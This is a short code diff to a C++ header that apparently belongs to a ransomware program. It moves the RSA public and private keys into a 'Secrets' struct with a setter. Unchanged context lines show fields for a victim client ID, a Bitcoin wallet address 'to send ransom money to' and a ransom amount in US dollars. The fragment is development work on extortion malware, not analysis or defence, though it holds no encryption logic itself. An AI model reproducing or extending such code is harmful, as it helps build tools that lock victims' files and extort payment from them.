@@ -25,8 +25,13 @@ public:
     Server        UDPServerDetails = {};
     SOCKET        UDPSocket = INVALID_SOCKET;
     SOCKET        TCPSocket = INVALID_SOCKET;
-    BIO*          RSAPublicKey;
     sockaddr_in   AddressInfo;
+    RSAKeys       Secrets;
+
+    inline void   SetEncryptionKeys(RSAKeys keys) {
+        this->Secrets.publicKey = keys.publicKey;
+        this->Secrets.privateKey = keys.privateKey;
+    }
 
 // Client only methods
 #ifdef CLIENT_RELEASE
@@ -54,7 +59,6 @@ public:
         this->ClientUID = dist(rng);
     }
     long           ClientUID = -1;
-    BIO*           RSAPrivateKey;
     std::string    UniqueBTCWalletAddress; // Wallet address to send ransom money to
     long           RansomAmountUSD;
 
